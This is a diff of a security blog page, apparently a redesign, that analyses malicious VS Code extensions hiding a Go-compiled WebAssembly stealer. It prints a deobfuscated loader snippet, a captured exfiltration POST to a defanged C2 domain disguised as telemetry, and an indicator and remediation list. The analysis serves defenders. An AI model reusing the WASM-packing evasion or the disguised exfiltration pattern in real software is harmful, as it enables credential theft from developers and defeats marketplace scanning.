+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+                        </button>
+                        <button type="button" class="ap-icon-btn" onclick="window.copyPilotCanonicalLink(this)" aria-label="Copy canonical link" title="Copy canonical link">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+                        </button>
+                        <button type="button" class="ap-icon-btn" onclick="window.print()" aria-label="Print article" title="Print article">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect width="12" height="8" x="6" y="14"/></svg>
+                        </button>
+                    </div>
+                </div>
+            </header>
+
+            <!-- LCP-Optimized 16:9 Featured Hero Figure -->
+            <figure class="ap-hero-figure">
+                <div class="ap-hero-img-wrap">
+                    <img src="/images/articles/vscode-malicious-extensions-2026.png"
+                         alt="Malware Analysis: inside the &#x27;MaliciousCorgi&#x27; VS Code Attack"
+                         width="1200"
+                         height="675"
+                         fetchpriority="high"
+                         decoding="async">
+                </div>
+                <figcaption class="ap-hero-caption">
+                    <span>FIG // Technical investigation &amp; adversary telemetry breakdown.</span>
+                    <span>THEHGTECH RESEARCH ARCHIVE</span>
+                </figcaption>
+            </figure>
+
+            <!-- Mobile & Tablet Collapsible Table of Contents -->
+            <details class="ap-mobile-toc">
+                <summary>
+                    <span>On This Page (4 Sections)</span>
+                    <svg class="ap-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+                </summary>
+                <ol class="ap-mobile-toc-list">
+                    <li><a href="#sec-1">1. I. Attack Vector: The &quot;WASM Packing&quot; Technique</a></li>
+                    <li><a href="#sec-2">2. II. Payload Analysis (Reverse Engineering)</a></li>
+                    <li><a href="#sec-3">3. III. Indicators of Compromise (IoCs)</a></li>
+                    <li><a href="#sec-4">4. IV. Remediation Instructions</a></li>
+                </ol>
+            </details>
+
+            <!-- 3-Zone Monograph Workspace (Sticky TOC + 70ch Prose + Dossier Rail) -->
+            <div class="ap-workspace">
+                <aside class="ap-toc-rail" aria-label="Article Table of Contents">
+                    <div class="ap-toc-header">
+                        <span>On This Page</span>
+                        <span id="apTocPct" class="ap-toc-pct">0%</span>
+                    </div>
+                    <div class="ap-toc-scroller">
+                        <div class="ap-sentinel-top" aria-hidden="true"></div>
+                        <div class="ap-scroll-hint-top" aria-hidden="true"></div>
+                        <nav class="ap-toc-nav" aria-label="Section links">
+                            <a href="#sec-1">1. I. Attack Vector: The &quot;WASM Packing&quot; Technique</a>
+                            <a href="#sec-2">2. II. Payload Analysis (Reverse Engineering)</a>
+                            <a href="#sec-3">3. III. Indicators of Compromise (IoCs)</a>
+                            <a href="#sec-4">4. IV. Remediation Instructions</a>
+                        </nav>
+                        <div class="ap-scroll-hint-bottom" aria-hidden="true"></div>
+                        <div class="ap-sentinel-bottom" aria-hidden="true"></div>
+                    </div>
+                </aside>
+
+                <div class="ap-prose" itemprop="articleBody">
+<section id="sec-overview">
+
+        
+        
 
             <div class="warning-alert">
-                <strong style="color: #f44336; font-size: 1.1rem;">ACTIVE THREAT ALERT</strong>
-                <p style="margin-top: 0.5rem; margin-bottom: 0;">If you have installed
+                <strong>ACTIVE THREAT ALERT</strong>
+                <p>If you have installed
                     <code>Publisher: AI-Code-Helper-Pro</code> or <code>Publisher: ChatMoss-GPT</code> extensions in VS
                     Code, your environment is compromised. Immediate remediation is required.</p>
             </div>
@@ -413,7 +519,11 @@
                 functional, high-quality AI code completion features. This utility masked their true purpose: turning
                 the developer's laptop into a persistent listening post inside the corporate network.</p>
 
-            <h2>I. Attack Vector: The "WASM Packing" Technique</h2>
+            
+</section>
+
+<section id="sec-1">
+<h2>1. I. Attack Vector: The &quot;WASM Packing&quot; Technique</h2>
             <p>The success of MaliciousCorgi lies in its evasion. The VS Code Marketplace has automated security
                 scanners that analyze JavaScript/TypeScript code for malicious patterns. To bypass this, the attackers
                 wrote the core malware logic in <strong>Go</strong>, compiled it to <strong>WebAssembly (WASM)</strong>,
@@ -427,16 +537,31 @@
             <div class="code-window">
                 <div class="code-header"><span>extension.ts (Deobfuscated)</span></div>
                 <div class="code-body">
-                    <pre><span class="token-keyword">async function</span> <span class="token-func">loadEngine</span><span class="token-punctuation">()</span> <span class="token-punctuation">{</span>
-    <span class="token-comment">// OSTENSIBLY: Loading the AI tensor model for code prediction</span>
-    <span class="token-keyword">const</span> wasmPath <span class="token-punctuation">=</span> path<span class="token-punctuation">.</span><span class="token-func">join</span><span class="token-punctuation">(</span>__dirname<span class="token-punctuation">,</span> <span class="token-string">'./models/inference-core.wasm'</span><span class="token-punctuation">);</span>
-    <span class="token-keyword">const</span> buffer <span class="token-punctuation">=</span> fs<span class="token-punctuation">.</span><span class="token-func">readFileSync</span><span class="token-punctuation">(</span>wasmPath<span class="token-punctuation">);</span>
+                    <div class="ap-code-block">
+    <div class="ap-code-header">
+        <div class="ap-code-meta">
+            <span class="ap-code-lang" data-lang="code">CODE</span>
+            <span class="ap-code-title">CODE Artifact</span>
+        </div>
+        <div class="ap-code-actions">
+            <button type="button" class="ap-code-btn" data-action="wrap-code" aria-pressed="false">Wrap</button>
+            <button type="button" class="ap-code-btn" data-action="copy-code" aria-label="Copy code block">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+                <span>Copy</span>
+            </button>
+        </div>
+    </div>
+    <pre><code>async function loadEngine() {
+    // OSTENSIBLY: Loading the AI tensor model for code prediction
+    const wasmPath = path.join(__dirname, &#x27;./models/inference-core.wasm&#x27;);
+    const buffer = fs.readFileSync(wasmPath);
     
-    <span class="token-comment">// REALITY: Initializing the malware Go runtime</span>
-    <span class="token-keyword">const</span> go <span class="token-punctuation">=</span> <span class="token-keyword">new</span> <span class="token-func">Go</span><span class="token-punctuation">();</span>
-    <span class="token-keyword">const</span> <span class="token-punctuation">{</span> instance <span class="token-punctuation">}</span> <span class="token-punctuation">=</span> <span class="token-keyword">await</span> WebAssembly<span class="token-punctuation">.</span><span class="token-func">instantiate</span><span class="token-punctuation">(</span>buffer<span class="token-punctuation">,</span> go<span class="token-punctuation">.</span>importObject<span class="token-punctuation">);</span>
-    go<span class="token-punctuation">.</span><span class="token-func">run</span><span class="token-punctuation">(</span>instance<span class="token-punctuation">);</span>
-<span class="token-punctuation">}</span></pre>
+    // REALITY: Initializing the malware Go runtime
+    const go = new Go();
+    const { instance } = await WebAssembly.instantiate(buffer, go.importObject);
+    go.run(instance);
+}</code></pre>
+</div>
                 </div>
             </div>
 
@@ -444,7 +569,11 @@
                 small enough to look like a legitimate machine learning model file. Marketplace scanners ignored the
                 binary blob, assuming it was data.</p>
 
-            <h2>II. Payload Analysis (Reverse Engineering)</h2>
+            
+</section>
+
+<section id="sec-2">
+<h2>2. II. Payload Analysis (Reverse Engineering)</h2>
             <p>Our team successfully decompiled the WASM blob back into readable Go pseudo-code using the
                 <code>wasm2wat</code> and <code>ghidra</code> toolchain. The malware, internally named
                 <code>GopherSteal</code>, operates in three phases.</p>
@@ -475,24 +604,44 @@
             <div class="code-window">
                 <div class="code-header"><span>Network Traffic Analysis (Wireshark)</span></div>
                 <div class="code-body">
-                    <pre><span class="token-keyword">POST</span> https://api.maliciouscorgi[.]net/v1/telemetry <span class="token-keyword">HTTP/1.1</span>
-<span class="token-var">Content-Type</span>: application/json
+                    <div class="ap-code-block">
+    <div class="ap-code-header">
+        <div class="ap-code-meta">
+            <span class="ap-code-lang" data-lang="code">CODE</span>
+            <span class="ap-code-title">CODE Artifact</span>
+        </div>
+        <div class="ap-code-actions">
+            <button type="button" class="ap-code-btn" data-action="wrap-code" aria-pressed="false">Wrap</button>
+            <button type="button" class="ap-code-btn" data-action="copy-code" aria-label="Copy code block">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+                <span>Copy</span>
+            </button>
+        </div>
+    </div>
+    <pre><code>POST https://api.maliciouscorgi[.]net/v1/telemetry HTTP/1.1
+Content-Type: application/json
 
-<span class="token-punctuation">{</span>
-  <span class="token-string">"event"</span>: <span class="token-string">"prediction_accepted"</span>,
-  <span class="token-string">"latency"</span>: 45,
-  <span class="token-comment">// The stolen data is encoded in this base64 blob field, </span>
-  <span class="token-comment">// masquerading as a debug log dump.</span>
-  <span class="token-string">"debug_trace"</span>: <span class="token-string">"H4sIAAAAAAAA/.....[truncated]..."</span>
-<span class="token-punctuation">}</span></pre>
+{
+  &quot;event&quot;: &quot;prediction_accepted&quot;,
+  &quot;latency&quot;: 45,
+  // The stolen data is encoded in this base64 blob field, 
+  // masquerading as a debug log dump.
+  &quot;debug_trace&quot;: &quot;H4sIAAAAAAAA/.....[truncated]...&quot;
+}</code></pre>
+</div>
                 </div>
             </div>
 
-            <h2>III. Indicators of Compromise (IoCs)</h2>
+            
+</section>
+
+<section id="sec-3">
+<h2>3. III. Indicators of Compromise (IoCs)</h2>
             <p>Security teams should immediately scan their environments for the following indicators. Note that the
                 attackers rotate domains frequently.</p>
 
-            <table class="ioc-table">
+            <div class="table-wrapper ap-stackable">
+<table class="ioc-table">
                 <thead>
                     <tr>
                         <th>Indicator Type</th>
@@ -502,34 +651,39 @@
                 </thead>
                 <tbody>
                     <tr>
-                        <td>Extension ID</td>
+                        <th>Extension ID</th>
                         <td><code>publisher.ai-code-helper-pro</code></td>
                         <td>Primary vector</td>
                     </tr>
                     <tr>
-                        <td>Extension ID</td>
+                        <th>Extension ID</th>
                         <td><code>publisher.chatmoss-gpt</code></td>
                         <td>Secondary vector</td>
                     </tr>
                     <tr>
-                        <td>File Hash (SHA256)</td>
+                        <th>File Hash (SHA256)</th>
                         <td><code>a7f89...b29c1</code></td>
                         <td>inference-core.wasm</td>
                     </tr>
                     <tr>
-                        <td>Network Domain</td>
+                        <th>Network Domain</th>
                         <td><code>api.maliciouscorgi[.]net</code></td>
                         <td>C2 Server</td>
                     </tr>
                     <tr>
-                        <td>Process Argument</td>
+                        <th>Process Argument</th>
                         <td><code>--enable-wasm-simd</code></td>
                         <td>Used by malware to accelerate encryption</td>
                     </tr>
                 </tbody>
             </table>
+</div>
 
-            <h2>IV. Remediation Instructions</h2>
+            
+</section>
+
+<section id="sec-4">
+<h2>4. IV. Remediation Instructions</h2>
             <p>If you identify an infected host, simply uninstalling the extension is <strong>insufficient</strong>. The
                 malware establishes persistence outside of VS Code.</p>
 
@@ -544,70 +698,324 @@
                     directories (<code>/usr/local/lib/node_modules/</code>) that are difficult to clean manually.</li>
             </ol>
 
-            <p style="font-size: 0.9rem; color: #666; margin-top: 3rem; border-top: 1px solid #333; padding-top: 1rem;">
+            <p>
                 <em>Report generated by TheHGTech Malware Research Unit. Special thanks to security researcher 'Azeria'
                     for assistance with WASM decompilation.</em>
             </p>
         
-            <!-- ========== RELATED ARTICLES ========== -->
-            <div class="related-articles-section" style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--glass-border);">
-                <h3 style="color: var(--accent-cyan); margin-bottom: 1.5rem; font-size: 1.3rem;">Related Analysis</h3>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem;">
+            
+            <div class="related-articles-section">
+                <h3>Related Analysis</h3>
+                <div>
                     
-                    <a href="/articles/anthropic-project-glasswing-2026.html" style="text-decoration: none;">
-                        <div class="related-card" style="background: rgba(255,255,255,0.03); border: 1px solid var(--glass-border); border-radius: 8px; padding: 1rem; height: 100%; transition: all 0.3s ease;">
-                            <div style="font-size: 0.75rem; color: var(--accent-cyan); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.5rem;">AI Security</div>
-                            <h4 style="color: var(--text-primary); margin: 0 0 0.5rem; font-size: 1.1rem; line-height: 1.3;">Project Glasswing: Anthropic's Defensive AI</h4>
-                            <p style="color: var(--text-secondary); font-size: 0.9rem; margin: 0; line-height: 1.4;">How autonomous agents are transforming incident response.</p>
+                    <a href="/articles/anthropic-project-glasswing-2026.html">
+                        <div class="related-card">
+                            <div>AI Security</div>
+                            <h4>Project Glasswing: Anthropic's Defensive AI</h4>
+                            <p>How autonomous agents are transforming incident response.</p>
                         </div>
                     </a>
 
-                    <a href="/articles/axios-supply-chain-attack-2026.html" style="text-decoration: none;">
-                        <div class="related-card" style="background: rgba(255,255,255,0.03); border: 1px solid var(--glass-border); border-radius: 8px; padding: 1rem; height: 100%; transition: all 0.3s ease;">
-                            <div style="font-size: 0.75rem; color: #ff3d3d; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.5rem;">Supply Chain</div>
-                            <h4 style="color: var(--text-primary); margin: 0 0 0.5rem; font-size: 1.1rem; line-height: 1.3;">Axios npm Package Compromise</h4>
-                            <p style="color: var(--text-secondary); font-size: 0.9rem; margin: 0; line-height: 1.4;">Inside the 2026 supply chain attack affecting millions of builds.</p>
+                    <a href="/articles/axios-supply-chain-attack-2026.html">
+                        <div class="related-card">
+                            <div>Supply Chain</div>
+                            <h4>Axios npm Package Compromise</h4>
+                            <p>Inside the 2026 supply chain attack affecting millions of builds.</p>
                         </div>
                     </a>
 
-                    <a href="/articles/forticlient-ems-zero-day-cve-2026-35616.html" style="text-decoration: none;">
-                        <div class="related-card" style="background: rgba(255,255,255,0.03); border: 1px solid var(--glass-border); border-radius: 8px; padding: 1rem; height: 100%; transition: all 0.3s ease;">
-                            <div style="font-size: 0.75rem; color: #ff3d3d; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.5rem;">Zero-Day</div>
-                            <h4 style="color: var(--text-primary); margin: 0 0 0.5rem; font-size: 1.1rem; line-height: 1.3;">FortiClient EMS Critical Vulnerability</h4>
-                            <p style="color: var(--text-secondary); font-size: 0.9rem; margin: 0; line-height: 1.4;">CVE-2026-35616 analysis and immediate mitigation steps.</p>
+                    <a href="/articles/forticlient-ems-zero-day-cve-2026-35616.html">
+                        <div class="related-card">
+                            <div>Zero-Day</div>
+                            <h4>FortiClient EMS Critical Vulnerability</h4>
+                            <p>CVE-2026-35616 analysis and immediate mitigation steps.</p>
                         </div>
                     </a>
 
                 </div>
             </div>
 
+        
+</section>
+
+                    <div class="ap-article-footer-bar">
+                        <div>
+                            <div class="ap-byline-label">Canonical Reference</div>
+                            <div class="ap-byline-sub">thehgtech.com/articles/vscode-malicious-extensions-supply-chain-2026.html</div>
+                        </div>
+                        <div class="ap-share-cluster" role="group" aria-label="Share or print article">
+                        <button type="button" class="ap-icon-btn" onclick="window.sharePilotX(event)" aria-label="Share on X" title="Share on X">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                        </button>
+                        <button type="button" class="ap-icon-btn" onclick="window.sharePilotLinkedIn(event)" aria-label="Share on LinkedIn" title="Share on LinkedIn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+                        </button>
+                        <button type="button" class="ap-icon-btn" onclick="window.copyPilotCanonicalLink(this)" aria-label="Copy canonical link" title="Copy canonical link">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+                        </button>
+                        <button type="button" class="ap-icon-btn" onclick="window.print()" aria-label="Print article" title="Print article">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect width="12" height="8" x="6" y="14"/></svg>
+                        </button>
+                    </div>
+                    </div>
+
+                    <div class="ap-author-card">
+                        <div class="ap-author-avatar" aria-hidden="true">TS</div>
+                        <div>
+                            <div class="ap-byline-label">About the Author</div>
+                            <div class="ap-byline-val" style="margin:0.15rem 0 0.35rem;"><a href="/about.html">TheHGTech Security Team</a> — Independent Security Researcher</div>
+                            <p style="margin:0;font-size:0.88rem;line-height:1.6;color:var(--ap-ink-secondary);">
+                                Independent vulnerability researcher and defensive architect focusing on enterprise detection engineering, WebPKI trust infrastructure, CISA KEV triage, and practitioner field manuals at TheHGTech.
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Interaction Bar (Triggers Newsletter & GraphComment Discussion) -->
+                    <div class="interaction-bar" data-article-id="vscode-malicious-extensions-supply-chain-2026">
+                        <div class="like-section">
+                            <button class="like-btn" id="likeBtn" onclick="toggleLike()">
+                                <i class="far fa-heart"></i> <span id="likeText">Like this article</span>
+                            </button>
+                        </div>
+                        <div class="action-buttons">
+                            <div class="share-buttons">
+                                <a href="#" onclick="shareTwitter(event)" class="share-btn" title="Share on Twitter" aria-label="Share on Twitter">
+                                    <i class="fab fa-twitter"></i>
+                                </a>
+                                <a href="#" onclick="shareLinkedIn(event)" class="share-btn" title="Share on LinkedIn" aria-label="Share on LinkedIn">
+                                    <i class="fab fa-linkedin-in"></i>
+                                </a>
+                                <button onclick="copyLink()" class="share-btn" title="Copy Link" aria-label="Copy Link">
+                                    <i class="fas fa-link"></i>
+                                </button>
+                            </div>
+                            <div class="button-separator"></div>
+                            <button onclick="window.print()" class="print-btn" title="Print Article" aria-label="Print Article">
+                                <i class="fas fa-print"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Sticky Technical Dossier Rail -->
+                <aside class="ap-dossier-rail" aria-label="Technical Dossier and Research Navigation">
+                    <div class="ap-rail-card">
+                        <h2 class="ap-rail-title">Research Dossier</h2>
+                        <dl class="ap-rail-kv">
+                            <div><dt>Category</dt><dd>Supply Chain Attack</dd></div>
+                            <div><dt>Publication</dt><dd>January 30, 2026</dd></div>
+                            <div><dt>Sections</dt><dd>4 Technical Parts</dd></div>
+                            <div><dt>Verification</dt><dd>Primary Sources</dd></div>
+                            <div><dt>TLP Classification</dt><dd>TLP:CLEAR</dd></div>
+                        </dl>
+                    </div>
+
+                    <div class="ap-rail-card">
+                        <h2 class="ap-rail-title">Live Security Tools</h2>
+                        <div class="ap-rail-links">
+                            <a href="/threat-intel.html" class="ap-rail-link">
+                                <span class="ap-rail-link-kicker">Live Feed</span>
+                                <span class="ap-rail-link-title">Threat Intelligence Platform (4h Updates)</span>
+                            </a>
+                            <a href="/cve-tracker.html" class="ap-rail-link">
+                                <span class="ap-rail-link-kicker">Advisory Feed</span>
+                                <span class="ap-rail-link-title">CISA KEV + EPSS Exploited Vulnerabilities</span>
+                            </a>
+                            <a href="/tools/grc-assessment/" class="ap-rail-link">
+                                <span class="ap-rail-link-kicker">Compliance</span>
+                                <span class="ap-rail-link-title">ISO 27001 GRC Assessment Tool</span>
+                            </a>
+                        </div>
+                    </div>
+                </aside>
+            </div>
         </article>
+    </main>
 
-        <!-- Interaction Bar -->
-        <div class="interaction-bar">
-            <div class="like-section">
-                <button class="like-btn" id="likeBtn" onclick="toggleLike()">
-                    <i class="far fa-heart"></i> <span id="likeText">Like this analysis</span>
-                </button>
+    <!-- Contextual Related Research Section -->
+    <section class="ap-related-section" aria-label="Related Research & Field Manuals">
+        <div class="ap-related-inner">
+            <div class="ap-related-header">
+                <div class="ap-related-kicker">Peer Analysis &amp; Investigation Manuals</div>
+                <h2 class="ap-related-heading">Related Security Research</h2>
             </div>
-            <div class="action-buttons">
-                <div class="share-buttons">
-                    <a href="#" onclick="shareTwitter(event)" class="share-btn"><i class="fab fa-twitter"></i></a>
-                    <a href="#" onclick="shareLinkedIn(event)" class="share-btn"><i class="fab fa-linkedin-in"></i></a>
-                    <button onclick="copyLink()" class="share-btn"><i class="fas fa-link"></i></button>
+            <div class="ap-related-grid">
+            <a href="/articles/luxshare-apple-breach-2025.html" class="ap-related-card">
+                <div class="ap-related-thumb">
+                    <img src="/images/articles/luxshare-apple-breach-2025.png" alt="Luxshare Ransomware Attack: Apple Vision Pro CAD Designs and Secret Product Data Stolen" loading="lazy">
                 </div>
-                <button onclick="window.print()" class="print-btn"><i class="fas fa-print"></i></button>
+                <div class="ap-related-content">
+                    <div class="ap-related-meta">
+                        <span class="ap-pill ap-pill-category">Supply Chain Attack</span>
+                        <span>January 22, 2026</span>
+                    </div>
+                    <h3 class="ap-related-title">Luxshare Ransomware Attack: Apple Vision Pro CAD Designs and Secret Product Data Stolen</h3>
+                    <p class="ap-related-excerpt">RansomHub claims breach of Apple supplier Luxshare. Over 1TB of confidential data stolen including 3D CAD designs for Vision Pro, iPhone, AirPods, and unreleased products.</p>
+                    <div class="ap-related-footer">
+                        <span>By Harish G</span>
+                        <span>8 min read &rarr;</span>
+                    </div>
+                </div>
+            </a>
+            <a href="/articles/enterprise-vulnerability-management-exposure-blind-spot-2026.html" class="ap-related-card">
+                <div class="ap-related-thumb">
+                    <img src="/images/articles/enterprise-vulnerability-management-exposure-blind-spot-2026.png" alt="The Exposure Blind Spot: Why Enterprise Vulnerability Management Is Struggling in the AI Era" loading="lazy">
+                </div>
+                <div class="ap-related-content">
+                    <div class="ap-related-meta">
+                        <span class="ap-pill ap-pill-category">Cybersecurity</span>
+                        <span>October 30, 2026</span>
+                    </div>
+                    <h3 class="ap-related-title">The Exposure Blind Spot: Why Enterprise Vulnerability Management Is Struggling in the AI Era</h3>
+                    <p class="ap-related-excerpt">Enterprise security isn&#x27;t just struggling to patch. It&#x27;s struggling to understand its own environment. This analysis examines how gaps in asset, identity and dependency visibility slow both vulnerability remediation and incident response, and how one shared context foundation supports both.</p>
+                    <div class="ap-related-footer">
+                        <span>By Harish G</span>
+                        <span>14 min read &rarr;</span>
+                    </div>
+                </div>
+            </a>
+            <a href="/articles/beyond-the-headlines-cybersecurity-incident-readiness-2026.html" class="ap-related-card">
+                <div class="ap-related-thumb">
+                    <img src="/images/articles/beyond-the-headlines-cybersecurity-incident-readiness-2026.png" alt="Beyond the Headlines: How Security Teams Can Prepare for the Next Cybersecurity Incident" loading="lazy">
+                </div>
+                <div class="ap-related-content">
+                    <div class="ap-related-meta">
+                        <span class="ap-pill ap-pill-category">Cybersecurity</span>
+                        <span>October 22, 2026</span>
+                    </div>
+                    <h3 class="ap-related-title">Beyond the Headlines: How Security Teams Can Prepare for the Next Cybersecurity Incident</h3>
+                    <p class="ap-related-excerpt">A news-driven technical security analysis and defensive readiness playbook. Deconstructing the October 22 vulnerability surge across PHP, Node.js, NGINX, Go, GitLab, and eMudhra alongside the SBI data exposure into actionable detection, exposure management, and compliance controls.</p>
+                    <div class="ap-related-footer">
+                        <span>By Harish G</span>
+                        <span>8 min read &rarr;</span>
+                    </div>
+                </div>
+            </a>
             </div>
         </div>
-    </div>
+    </section>
 
-    <footer>
-        <p>&copy; 2026 TheHGTech Labs.</p>
+    <!-- Mobile Quick-Jump TOC Pill -->
+    <button type="button" id="apMobileJumpPill" class="ap-mobile-jump-pill" onclick="window.jumpToMobileToc()" aria-label="Jump to Table of Contents">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
+        <span>Contents</span>
+    </button>
+
+    <!-- Native Light-Dismiss Technical Diagram Lightbox -->
+    <dialog id="apLightbox" class="ap-lightbox" closedby="any" aria-label="Technical diagram viewer">
+        <div class="ap-lightbox-inner">
+            <div class="ap-lightbox-bar">
+                <span id="apLightboxCaption">Technical Architecture Diagram</span>
+                <form method="dialog" style="margin:0;">
+                    <button type="submit" class="ap-lightbox-close" aria-label="Close diagram viewer">ESC · Close</button>
+                </form>
+            </div>
+            <div class="ap-lightbox-body">
+                <img id="apLightboxImg" alt="">
+            </div>
+        </div>
+    </dialog>
+
+    <!-- Screen Reader Live Status Region -->
+    <div id="apLiveStatus" role="status" aria-live="polite" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);"></div>
+
+    <!-- Canonical Multi-Column Footer -->
+    <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+            <div class="footer-grid">
+                <div class="footer-brand">
+                    <a href="/" class="footer-brand-logo" aria-label="TheHGTech Home">
+                        <img src="/assets/brand/svg/hg-symbol.svg" alt="" width="28" height="34" class="logo-dark">
+                        <img src="/assets/brand/svg/hg-symbol-light.svg" alt="" width="28" height="34" class="logo-light">
+                        <span class="logo-text" style="margin-left: 10px; font-weight: 800; font-size: 1.25rem;">
+                            <span class="logo-text-base">The</span><span class="logo-text-red">HG</span><span class="logo-text-base">Tech</span>
+                        </span>
+                    </a>
+                    <p class="footer-tagline">
+                        Independent security research, practitioner field manuals, and live vulnerability intelligence.
+                    </p>
+                    <div class="footer-social-row">
+                        <a href="https://x.com/thehgtech" class="footer-social-icon" target="_blank" rel="noopener noreferrer" aria-label="Follow TheHGTech on X">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                        </a>
+                        <a href="https://linkedin.com/company/thehgtech" class="footer-social-icon" target="_blank" rel="noopener noreferrer" aria-label="Follow TheHGTech on LinkedIn">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
+                        </a>
+                        <a href="https://facebook.com/thehgtech" class="footer-social-icon" target="_blank" rel="noopener noreferrer" aria-label="Follow TheHGTech on Facebook">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M9 8H6v4h3v12h5V12h3.642L18 8h-4V6.333C14 5.374 14.5 5 15.5 5H18V0h-3.808C10.595 0 9 1.583 9 4.615V8z"/></svg>
+                        </a>
+                        <a href="https://youtube.com/@thehgtech" class="footer-social-icon" target="_blank" rel="noopener noreferrer" aria-label="Subscribe to TheHGTech on YouTube">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+                        </a>
+                    </div>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Navigation</h4>
+                    <ul class="footer-links">
+                        <li><a href="/">Homepage</a></li>
